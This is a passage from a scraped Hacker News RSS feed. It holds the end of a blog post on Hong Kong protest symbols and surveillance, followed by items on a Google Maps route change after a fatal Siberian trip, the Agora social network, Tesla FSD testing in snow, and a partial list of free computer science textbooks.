<p>And here’s <a href="https://www.hongkongfp.com/2019/10/08/tiffany-removes-advert-hong-kong-controversy/">another Tiffany ad</a>, also removed following complaints to the company for stirring up social disorder.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-1024x532.jpg" alt="Tiffany ad - covered right eye" width="525" height="273" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-1024x532.jpg 1024w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-300x156.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2-768x399.jpg 768w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-2.jpg 1050w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>And to compare, here’s another picture of Sun Feifei (the same model in the second Tiffany ad) covering her right eye in another photo shoot, also months before the protests in Hong Kong. And actually shown on a <a href="http://www.china.org.cn/photos/2010-04/20/content_19863707.htm">government-run website, even today</a>.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye.jpg" alt="Tiffany model covering her right eye" width="400" height="600" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye.jpg 400w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Sun-Feifei-eye-200x300.jpg 200w" sizes="(max-width: 400px) 100vw, 400px"></p>
<p>So eye covering can look like a matter of intent. The china.org.cn right eye picture can obviously have no connection to the Hong Kong protests. But a foreign company is different, even with ads shot months before the covered eye became a protest symbol.</p>
<p>Of course, the covered eye — again, the right eye — has been used famously before in an ad campaign: “The Man in the Hathaway Shirt.”</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-595x800.jpg" alt="Man in the Hathaway shirt" width="525" height="706" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-595x800.jpg 595w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt-223x300.jpg 223w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/hathaway-shirt.jpg 645w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>No political meaning. Just an Ogilvy ad with the eyepatch used as a gimmick.</p>
<p>But there’s more again.</p>
<p>A <a href="https://shanghaiist.com/2019/10/08/houston-rockets-fan-detained-for-posting-photo-of-himself-about-to-burn-chinese-flag/">Houston Rockets fan in China</a> (the same team whose manager posted a “Stand with Hong Kong” tweet) was much too cynical on the ability of his government to track him down.</p>
<p>The first line (after the hashtag) says: “I live and die with my team.” The second line: “Come and catch me.”</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-1024x546.jpg" alt="Covered right eye, now in jail" width="525" height="280" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest.jpg 1024w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-300x160.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/rockets-fan-arrest-768x410.jpg 768w" sizes="(max-width: 525px) 100vw, 525px"></p>
<p>They caught him, just a few hours later. And it appears he covered an eye to make facial identification more difficult. But again, what if he hadn’t covered his eye?</p>
<p>The apology from Tiffany strikes an international audience as the exportation of anti-protester values. The above picture of the NBA fan chained in a “tiger chair” strikes an international audience as not the future they want for themselves. <strong>Has the visual symbol of the eye — uncontrollable once the injury and advertisements happened — helped spread this message further?</strong></p>
<h2>Wearing of Masks</h2>
<p>Should protesters anywhere be allowed to wear masks? While a number of US states already had <a href="https://www.bostonglobe.com/metro/2019/10/22/boston-and-hong-kong-debate-over-masks/JYajFCkul7UMw7PaXyZ5vL/story.html">mask bans in public spaces</a>, general public opinion seemed even more in support of the bans after a number of mask wearing Antifa members beat up a reporter in Portland earlier this year. The argument against masks was that covering one’s face minimize the feeling of social disapproval and led to worse behavior.</p>
<p>The US has at times overturned mask bans, famously after the Iranian Revolution as a way to protect Iranian protesters in California. But those masked were protesting a government from which they had fled to the US. It’s a different story when the protesters are domestic.</p>
<p>But a different explanation emerged in the Hong Kong protests now that we have <a href="https://unintendedconsequenc.es/emergence-of-omniscience-part-1-images/">identity at scale</a>. Protesters had already taken cautions to avoid identification by using single-use MTR (metro) transit cards and paying in cash. But faces could be identified at scale either live or in the near future by capturing records of protest attendance, assessing behavior, and following up with repercussions.</p>
<p>Hong Kong protesters also try to take down eyes on the crowd in the form of smart lampposts. There are a number of videos of them <a href="https://www.hongkongfp.com/2019/08/24/tear-gas-kwun-tong-hong-kong-protesters-surround-police-station-dismantle-surveillance-lampposts/">dismantling these lampposts</a> out of fear of surveillance.</p>
<p>For me it’s interesting to reflect on the news from Hong Kong because Hong Kong is a place I have visited over almost 30 years. During that time, I also lived there for around six years. Five of the visits and about one year of the living there was pre-Handover. In the time leading up to 1997, I observed (can’t really say I demonstrated) in a few events. These fell into a few types:</p>
<ul>
<li>Marches, often along Queen’s Road, in crowds in the tens of thousands or hundreds of thousands.</li>
<li>Sit-down demonstrations outside of the New China News Agency (the NCNA was the de facto Chinese embassy pre-Handover).</li>
<li>June 4th remembrances in Victoria Park (including the last pre-Handover one), often culminating in the crowd holding lit candles. <a href="https://www.youtube.com/watch?v=kYwsPt854Xo">Cui Jian’s <em>Nothing To My Name</em></a> would always be played (a song popular at 1989 Tiananmen).</li>
</ul>
<p>No one wore a mask, because there wasn’t any need to do so. The protest leaders were already known. The crowd was safe in numbers. I never heard anyone fear identification, even post-Handover.</p>
<p>If you contrast the protesters of back then with those of the last six months, they are unrecognizable.</p>
<p>That protesters hide their faces and cut down smart lampposts makes sense. Like the eyes in the advertisements above, the lampposts may not have any intent to use facial recognition to identify protesters, but there is no trust. Anything can look suspicious. If the capability is there to help your adversary, then you assume they use it. Especially if there are examples of mass surveillance already in place, for example in the Chinese province of <a href="https://unintendedconsequenc.es/uyghurs-xinjiang-onward-to-the-inevitable/">Xinjiang</a>.</p>
<h2>Consider</h2>
<ul>
<li>Identity at scale can weaken trust.</li>
<li>Visual symbols can spread a message.</li>
<li>Huang Yongyu’s owl paintings now sell at auction.</li>
</ul>
<!-- Begin Mailchimp Signup Form -->




<!--End mc_embed_signup-->	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://unintendedconsequenc.es/the-owls-right-eye/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574623</guid>
            <pubDate>Tue, 29 Dec 2020 20:38:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Maps changes a route after the drama of young people lost on a ghost road]]>
            </title>
            <description>
<![CDATA[
Score 235 | Comments 305 (<a href="https://news.ycombinator.com/item?id=25574180">thread link</a>) | @f311a
<br/>
December 29, 2020 | https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/ | <a href="https://web.archive.org/web/*/https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id=""><p><span>Google Maps</span></p><figcaption>A point on the Russian Highway of Bones.</figcaption></div><div><p><a rel="nofollow" target="_blank" href="https://www.google.com/maps/place/Yakutsk,+Rep%C3%BAblica+de+Saj%C3%A1,+Rusia/@62.0314236,129.5617032,22380m/data=!3m2!1e3!4b1!4m5!3m4!1s0x5bf63939a0d2c47d:0x69b4c4b35cafa2fb!8m2!3d62.0396912!4d129.7422192">Google Maps</a> has been forced to change a route in the Russian Far East after a young man, Sergei Ustinov, was tragically frozen to death and his friend, Vladislav Istomin, was found in serious condition.</p><p>The two 18-year-old friends wanted to make the journey between Yakutsk, capital of the Republic of Sakha, in eastern Siberia, and Madagan.  2,000 kilometers and 34 hours by <a rel="nofollow" target="_blank" title="car" href="https://45.32.73.142/cars/">car</a> separate both cities.  Despite the minus 50ºC in that area during these dates, the young people decided to make the trip in their Toyota Chaser.</p><p>Ustinov went to Google Maps to tell him which was the fastest route: it came out as recommended <a rel="nofollow" target="_blank" href="https://es.wikipedia.org/wiki/Autopista_de_Kolim%C3%A1">the Kolimá highway or Highway of the Bones</a>.  It was three hours faster than the Russian Yandex browser told him.</p></div><div id=""><p><span>Google Maps</span></p><figcaption>The distance between both populations.</figcaption></div><div><p>This road, as reported by official documents, is located in one of the coldest areas in the world, where the populations of<strong> </strong>Oimiakón and Tomtor, considered the coldest inhabited places on the planet, since they have temperatures of down to minus 71.2 ° C in the middle of winter.</p><p>In addition, local media assure that it is a road that has been in disuse since the 70s where there is practically nothing.</p><p>On the way, a stick from a tree struck the radiator of the car, leaving both young men lying in their vehicle in the middle of nowhere.  They tried to make a small fire with the spare wheel rim, but it was not possible due to the cold.</p><p>This was explained to the local media by the official of the Russian Investigation Committee, Nadezhda Dvoretskaya: “The two young men tried to keep warm and burned a tire, but apparently they could not make a big fire because they could not remove the rest of the tires” .</p><p>Dvoretskaya did say that the young people had been able to communicate with their families, <a rel="nofollow" target="_blank" href="https://www.semana.com/mundo/articulo/final-tragico-para-un-joven-que-atendio-las-recomendaciones-de-google-maps/202013/">as reported in the Colombian newspaper <em>Week</em></a>.</p><p>When a rescue committee found them, Ustinov had already died as a result of the cold.  Istomin, who was in serious condition, was taken by helicopter to a hospital in the town of Ust-Nera. <a rel="nofollow" target="_blank" href="https://siberiantimes.com/other/others/news/tragedy-in-yakutia-as-man-18-freezes-to-death-inside-broken-down-car-on-road-of-bones-at-50c/">According to information from <em>Siberian Times</em></a>, had a frostbite on his arms and legs and is fighting to save his life.</p></div><hr><p><strong>Source:</strong> <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">Huffington Post Spain Athena2</a> <strong>by</strong> <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">www.huffingtonpost.es</a>.</p><p>*The article has been translated based on the content of <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">Huffington Post Spain Athena2</a> by <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">www.huffingtonpost.es</a>. If there is any problem regarding the content, copyright, please leave a report below the article. We will try to process as quickly as possible to protect the rights of the author. Thank you very much!</p><p>*We just want readers to access information more quickly and easily with other multilingual content, instead of information only available in a certain language.</p><p>*We always respect the copyright of the content of the author and always include the original link of the source article.If the author disagrees, just leave the report below the article, the article will be edited or deleted at the request of the author. Thanks very much! Best regards!</p><hr><div> <div><div><div><ul><li> <label for="input-reason-553565"> Issue: <span>*</span> </label><br> </li><li> <label for="input-name-553565"> Your Name: <span>*</span> </label><br> </li><li> <label for="input-email-553565"> Your Email: <span>*</span> </label><br> </li></ul></div> </div></div></div></div></div>]]>
            </description>
            <link>https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574180</guid>
            <pubDate>Tue, 29 Dec 2020 20:06:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Agora – an experimental social network]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25573523">thread link</a>) | @flancian
<br/>
December 29, 2020 | http://anagora.org/node/agora | <a href="https://web.archive.org/web/*/http://anagora.org/node/agora">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	




<div>
<div>
    
<ul>
<li><a href="https://anagora.org/" rel="nofollow">The Agora is a distributed knowledge graph and experimental social network</a>.<ul>
<li>As an Agora <em>guest</em> you can currently:<ul>
<li>Navigate the Agora, which is composed of <a href="http://anagora.org/node/nodes" rel="nofollow">nodes</a> which aggregate content from many users about the same topic or entity.</li>
<li>Make use of <a href="http://anagora.org/node/backlinks" rel="nofollow">backlinks</a> and <a href="http://anagora.org/node/pulled-nodes" rel="nofollow">pulled nodes</a> to discover relevant content.</li>
</ul>
</li>
<li>As an Agora <em>user</em> you can:<ul>
<li>Have your content be surfaced to readers at relevant times (when they are visiting a <a href="http://anagora.org/node/node" rel="nofollow">node</a> for which your content is considered relevant by the community).</li>
<li>Have relevant content be surfaced to you as you traverse your <a href="http://anagora.org/node/personal-knowledge-graph" rel="nofollow">personal knowledge graph</a>.</li>
<li>Make use of <a href="http://anagora.org/node/agora-actions" rel="nofollow">agora actions</a>.</li>
</ul>
</li>
<li>Anyone can run an Agora of their own if they so desire. This Agora is <a href="http://anagora.org/node/open-source" rel="nofollow">open source</a>.</li>
</ul>
</li>
<li>To <a href="http://anagora.org/node/sign-up" rel="nofollow">sign up</a> for the Agora, first you need to publish your <a href="http://anagora.org/node/digital-garden" rel="nofollow">digital garden</a> or <a href="http://anagora.org/node/content" rel="nofollow">content</a> elsewhere online. The Agora doesn't host your data, but rather pulls it from a location <em>you</em> control and renders it for you and other users; it interlinks your data with that of other users as you wish.<ul>
<li>If you know your way around <a href="http://anagora.org/node/git" rel="nofollow">git</a>, <a href="http://anagora.org/node/markdown" rel="nofollow">markdown</a> on git is the default format. If you use <a href="http://anagora.org/node/roam" rel="nofollow">roam</a> or a <a href="http://anagora.org/node/roam-like" rel="nofollow">roam like</a> or you have a notes database, you're almost there. Please refer to <a href="https://anagora.org/go/agora-howto" rel="nofollow">agora howto</a> for detailed instructions.</li>
<li>Whatever participation mechanism you choose, you can either send a <a href="http://anagora.org/node/pull-request" rel="nofollow">pull request</a> adding yourself to the repository or let an Agora <a href="http://anagora.org/node/maintainer" rel="nofollow">maintainer</a> know where your <a href="http://anagora.org/node/digital-garden" rel="nofollow">digital garden</a> or <a href="http://anagora.org/node/content" rel="nofollow">content</a> is, so it can be pulled by the Agora and <a href="http://anagora.org/node/integrated" rel="nofollow">integrated</a>. We strive to continuously support new sources and formats. Please send email to signup@anagora.org or <a href="https://twitter.com/flancian" rel="nofollow">tweet at me</a> with:<ul>
<li>The URL for your content.</li>
<li>Your desired username.</li>
</ul>
</li>
<li>The Agora wants to be <a href="http://anagora.org/node/maximally-inclusive" rel="nofollow">maximally inclusive</a>, but it is in its infancy; it is a <a href="http://anagora.org/node/work-in-progress" rel="nofollow">work in progress</a>. If you want to participate and can't, please also send email to signup@anagora.org to let us know.<ul>
<li>Through projects such as <a href="http://anagora.org/node/agora-twitter-integration" rel="nofollow">agora twitter integration</a>, we hope to make the Agora available to anyone that has access to a social network account.</li>
</ul>
</li>
<li>If you want to learn more about the <a href="http://anagora.org/node/experimental" rel="nofollow">experimental</a> nature of this Agora, please refer to <a href="https://news.ycombinator.com/item?id=25577016" rel="nofollow">this Hacker News comment</a>.</li>
<li>If you want to keep up to date with development, consider adding me on Twitter or Mastodon: <a href="http://anagora.org/node/flancian" rel="nofollow">flancian</a>.</li>
</ul>
</li>
<li>An Agora is, in its most basic form, a set of useful conventions.<ul>
<li>Useful conventions are made explicit through an Agora's <a href="http://anagora.org/node/contract" rel="nofollow">CONTRACT</a> and the writing of its users.</li>
<li>You can think of the Agora as a distributed <a href="http://anagora.org/node/sequential-wiki" rel="nofollow">sequential wiki</a>; an experiment in <a href="http://anagora.org/node/semantic-web" rel="nofollow">semantic web</a> <a href="http://anagora.org/node/applications" rel="nofollow">applications</a>.</li>
<li>An Agora is a <a href="http://anagora.org/node/distributed-knowledge-graph" rel="nofollow">distributed knowledge graph</a> maintained by the users of an experimental <a href="http://anagora.org/node/social-network" rel="nofollow">social network</a>.<ul>
<li>By <a href="http://anagora.org/node/you" rel="nofollow">you</a> and <a href="http://anagora.org/node/me" rel="nofollow">me</a>. Anyone can participate if they are willing.</li>
<li>Check out <a href="http://anagora.org/node/agora-howto" rel="nofollow">agora howto</a> (users) or <a href="http://anagora.org/node/agora-plan" rel="nofollow">agora plan</a> (developers) if you want to jump in.</li>
</ul>
</li>
</ul>
</li>
<li>This Agora tries to be a good <a href="http://anagora.org/node/internet-citizen" rel="nofollow">internet citizen</a>. <ul>
<li>The <a href="http://anagora.org/node/agora-protocol" rel="nofollow">agora protocol</a> is openly developed and can be implemented by anyone.</li>
<li>See also: <a href="http://anagora.org/node/wikilinks-everywhere" rel="nofollow">wikilinks everywhere</a>. </li>
</ul>
</li>
<li><a href="http://anagora.org/node/go" rel="nofollow">go</a> <a href="http://github.com/flancian/agora" rel="nofollow">github.com/flancian/agora</a></li>
<li><a href="http://anagora.org/node/pull" rel="nofollow">pull</a> <a href="http://anagora.org/node/agora-editor" rel="nofollow">agora editor</a></li>
<li>There are <a href="http://anagora.org/node/other-agoras" rel="nofollow">other agoras</a>.</li>
</ul>
</div>

<div>
    
<ul>
<li>[ ] build a tool to filter a json roam export for only nodes tagged with <code>\#public</code> <a href="http://anagora.org/node/roam2agora" rel="nofollow">roam2agora</a></li>
</ul>
</div>

<div>
    <p>An agora, in its broadest sense, is a conceptual space where people attempt to bring an increased level of intentionality, explicitness, and mutual agreement to the principles and protocols for interacting in that space. A further aspect of the idea of an Agora is that it is a space which enables collaboration. In particular, it is a space that allows for collaboration guided by specific shared interests, without requiring the co-consitutients of the agora to be aligned more fully or generally in terms of their intentions, values, etc. </p>
<p>Some topics that the idea of an Agora is related to: <a href="http://anagora.org/node/transparency" rel="nofollow">transparency</a> <a href="http://anagora.org/node/decentralized-structures" rel="nofollow">decentralized structures</a> <a href="http://anagora.org/node/egalitarian-principles" rel="nofollow">egalitarian principles</a> <a href="http://anagora.org/node/judgement" rel="nofollow">judgement</a> <a href="http://anagora.org/node/algorithms-of-interaction" rel="nofollow">algorithms of interaction</a> <a href="http://anagora.org/node/communication" rel="nofollow">communication</a> <a href="http://anagora.org/node/collaboration" rel="nofollow">collaboration</a> <a href="http://anagora.org/node/knowledge-sharing" rel="nofollow">knowledge sharing</a></p>
<p>There are (infinitely) many possible variants of how this idea might be implemented in concrete, real-world situations. For example, an agora could be a space that is opened up inside a conversation between two people. Or it could be a collaborative project that is accompanied by specified rules. Or it could be a collective agreement about how to handle certain types of situations. </p>
<p>One variant of the idea of an Agora is a place where personal notes are shared, with the common goal of pooling information and sharing knowledge. One implementation of this idea is <a href="https://anagora.org/" rel="nofollow">https://anagora.org</a>. See also <a href="https://flancia.org/go/agora" rel="nofollow">https://flancia.org/go/agora</a>.</p>
<p>The term "Agora" and the basic idea come from <a href="http://anagora.org/node/flancia" rel="nofollow">Flancia</a>. </p>
</div>



</div>






<!--
 Copyright 2020 Google LLC

 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->




    </div></div>]]>
            </description>
            <link>http://anagora.org/node/agora</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573523</guid>
            <pubDate>Tue, 29 Dec 2020 19:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla FSD Beta 8 tested for self-driving performance in snowy conditions]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 141 (<a href="https://news.ycombinator.com/item?id=25573378">thread link</a>) | @CarCooler
<br/>
December 29, 2020 | https://www.teslaoracle.com/2020/12/29/fsd-beta-8-tested-for-self-driving-performance-in-snowy-conditions/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2020/12/29/fsd-beta-8-tested-for-self-driving-performance-in-snowy-conditions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
			<figure data-amp-original-style="margin-bottom:30px;">
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
<p>Tesla Full Self-Driving (FSD) Beta has now been updated 8 times since its launch back in October. The latest software version for FSD Beta is 2020.48.12.15, which is slightly on a different version path from the <a href="https://www.teslaoracle.com/2020/12/26/tesla-holiday-update-2020-48-26-is-here-v11-gets-delayed-release-notes-video/">2020.48.26 Holiday Update</a>.</p>



<p>The Dual-Motor Tesla Model S with the license plate shouting AIDRIVR has the privilege of being one of the few out there selected by Tesla for FSD Beta testing. In the following video, the owner and driver of this unique Model S takes his car for checking FSD Beta performance out in the snow. </p>



<div><figure><a href="https://evannex.com/?ref=Iqtidar_TeslaOracle_EVANNEX_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1MCcgd2lkdGg9JzMwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>– Sponsored –</figcaption></figure></div>



<p>The <a href="https://www.teslaoracle.com/topic/model-s/">Tesla Model S</a> in this video is equipped with summer-focused all-season tires, so traction and handling could’ve been better with the winter tires. Tesla’s <a href="https://shop.tesla.com/product/model-s-19_-slipstream-wheel-and-winter-tire-package" target="_blank" rel="noreferrer noopener">online shop</a> offers winter wheels and tire packages for the entire vehicle lineup. The Tesla Model S 19″ slipstream winter wheel and tire package range from $2,500 to $4,000. This Model S package includes the 4 x 245/45/19 – Pirelli Sottozero 3 tires.</p>



<p>In the newer Teslas, the Autopilot cameras are heated, so there is a lower probability of the car’s vision becoming blurred due to snow accumulation. </p>



<h2>In a snowy parking lot</h2>



<p>FSD Beta 8 in this series of tests is first evaluated in an almost empty parking lot with lots of snow. In the beginning, the car refuses to engage <a href="https://www.teslaoracle.com/topic/autopilot/">Autopilot</a> because of invisible road markings. Even when it accepts to be engaged in this snow-filled space, it gets confused and the driving is jerky, at last, it asks the driver to take over and disengages and comes to a full stop when not taken over.</p>



<p><strong>Related:</strong> <a href="https://www.teslaoracle.com/2020/12/18/autopilot-fsd-beta-will-get-absurdly-good-says-elon-musk-v7-test-videos/">FSD Beta 7 test videos in different scenarios.</a></p>



<h2>On the snowy roads</h2>



<p>In the next phase, the driver puts <a href="https://www.teslaoracle.com/topic/autopilot/">FSD Beta</a> on a snowy road to test if it works properly. Lane markings are pretty abrupt even after the heavy snowfall is cleared from the road. Lower grip because of non-winter tires is also a limiting factor here, Autopilot might handover the car to the driver if it feels the slippery situation is not safe.</p>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<p>At the start of the test, Autopilot was able to predict the drivable space but on its own, it was following the posted speed limit of 30 mph. The cruise speed limit then was set to 15 mph manually, in order to be on the safe side in these snowy conditions.</p>



<p>In the drive ahead, the driver had to take over a couple of times, otherwise Tesla Autopilot was able to handle the path pretty well.</p>



<p>By watching the video closely and from the driver’s feedback it can be easily said that <a href="https://www.teslaoracle.com/topic/autopilot/">Tesla Autopilot (FSD Beta)</a> is not yet ready for snowy conditions. It will be a while before Autopilot fully learns snow and the scenarios it puts in front of a car driver. However, the video is still fun to watch and I like the owner’s commentary as he has a good grip on the topic of FSD testing.</p>



<p>Follow us for more on <a href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank" rel="noreferrer noopener">Google News</a>&nbsp;|&nbsp;<a href="https://flipboard.com/@TeslaOracle" target="_blank" rel="noreferrer noopener nofollow">Flipboard</a>&nbsp;|&nbsp;<a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener">RSS </a><a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener nofollow">(</a><a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener">Feedly)</a>.</p>



<figure><div>
<amp-youtube data-videoid="TZ2Cir9OkPY" layout="responsive" width="16" height="9" title="Tesla FSD in the snow (Beta 8)" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://www.youtube.com/watch?v=TZ2Cir9OkPY"><amp-img src="https://i.ytimg.com/vi/TZ2Cir9OkPY/hqdefault.jpg" layout="fill" object-fit="cover" alt="Tesla FSD in the snow (Beta 8)" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div></figure>




		<!-- Adsense Matched -->
        <figure>
        <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="9763094783" data-auto-format="mcrspv" data-full-width="" i-amphtml-layout="fixed">
          
        </amp-ad>
        </figure><!-- Adsense Matched End -->
		</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2020/12/29/fsd-beta-8-tested-for-self-driving-performance-in-snowy-conditions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573378</guid>
            <pubDate>Tue, 29 Dec 2020 18:57:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Computer Science textbooks that are freely available online]]>
            </title>
            <description>
<![CDATA[
Score 488 | Comments 44 (<a href="https://news.ycombinator.com/item?id=25572852">thread link</a>) | @MrXOR
<br/>
December 29, 2020 | https://csgordon.github.io/books.html | <a href="https://web.archive.org/web/*/https://csgordon.github.io/books.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>


    

<p>Below is a loosely-categorized collection of links to CS textbooks in a variety of areas that are
freely available online, usually because they are one of the following:</p>

<ul>
  <li>An open textbook (such as PLAI, SF, or the HoTT book)</li>
  <li>An older book that is out of print, for which the copyright has returned to the original author(s)
(such as TTFP)</li>
  <li>An author’s own preprint or draft of a textbook.  This includes cases where the author has made
special arrangements with a publisher to host an electronic copy of a published text on their
homepage while it remains in print.</li>
</ul>

<p>Most of these I’ve only used for brief personal reference, and have not read in depth.  The exceptions, those books I’ve spent considerable time with and highly recommend, are marked with asterisks.</p>

<p>I also include below a list of papers I consider good stand-alone introductions to certain topics, and a list of links to thorough special topics courses.</p>

<p>If you find one of the links below is broken or has moved, feel free to let me know.</p>

<p>Those with time to spare and looking to have less of it may enjoy browsing the QA call numbers in <a href="http://onlinebooks.library.upenn.edu/">UPenn’s extensive listing of online books</a>.  Most of those listed here were found independently over the years, but I’ve just now (June 2020) learned of this excellent repository of links.  I’ll add to the links below as I find promising books.</p>

<h2 id="programming-language-theory--program-analysis-including-automata">Programming Language Theory &amp; Program Analysis (including Automata)</h2>
<p>Topics such as semantics, types, abstract interpretation, proof assistants…</p>

<ul>
  <li><a href="http://www.cis.upenn.edu/~bcpierce/sf/">Software Foundations</a></li>
  <li><a href="http://www.cs.cmu.edu/~rwh/plbook/">Practical Foundations for Programming Languages (draft)</a></li>
  <li><a href="http://www.cse.chalmers.se/research/group/logic/book/">Programming in Martin-Lof’s Type Theory</a></li>
  <li><a href="http://www.paultaylor.eu/stable/Proofs+Types.html">Proofs and Types</a></li>
  <li><a href="http://www.paultaylor.eu/~pt/prafm/">Practical Foundations of Mathematics</a></li>
  <li>*<a href="http://www.cs.brown.edu/~sk/Publications/Books/ProgLangs/">Programming Languages: Application and Interpretation</a>
  (second edition <a href="http://www.cs.brown.edu/courses/cs173/2012/book/">in progress</a>)</li>
  <li><a href="http://www.daimi.au.dk/~bra8130/Wiley_book/wiley.html">Semantics with Applications</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.17.7385">Lectures on the Curry Howard Isomorphism (draft)</a></li>
  <li>*<a href="http://www.cs.kent.ac.uk/people/staff/sjt/TTFP/">Type Theory and Functional Programming</a></li>
  <li>*<a href="http://adam.chlipala.net/cpdt/">Certified Programming with Dependent Types</a></li>
  <li><a href="http://www21.in.tum.de/~nipkow/LNCS2283/">Isabelle/HOL: A Proof Assistant for Higher-Order Logic</a></li>
  <li><a href="http://www.usingcsp.com/">Communicating Sequential Processes</a></li>
  <li><a href="http://www.cs.cmu.edu/~jcr/craftprog.html">The Craft of Programming</a></li>
  <li><a href="http://people.cis.ksu.edu/~schmidt/text/densem.html">Denotational Semantics: A Methodology for Language Development</a></li>
  <li>*<a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.26.4391">Lambda Calculi with Types</a></li>
  <li><a href="http://www.cs.ru.nl/~henk/book.pdf">Lambda Calculus with Types</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.56.7045">Logics and Type Systems</a></li>
  <li><a href="http://www.cs.ox.ac.uk/publications/books/PfS/">Programming from Specifications</a></li>
